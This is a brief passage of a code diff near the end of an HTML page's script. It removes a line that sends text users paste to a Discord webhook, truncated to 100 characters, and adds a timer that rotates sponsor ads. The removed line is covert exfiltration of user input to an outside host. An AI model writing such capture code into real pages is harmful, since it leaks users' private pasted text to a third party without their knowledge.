-      sendDiscordWebhook('Text Pasted', `User pasted text: ${pastedText.slice(0, 100)}${pastedText.length > 100 ? '...' : ''}`);
-    });
+      setInterval(rotateSponsorAds, 12000);
+    };
   </script>
 </body>
 </html>
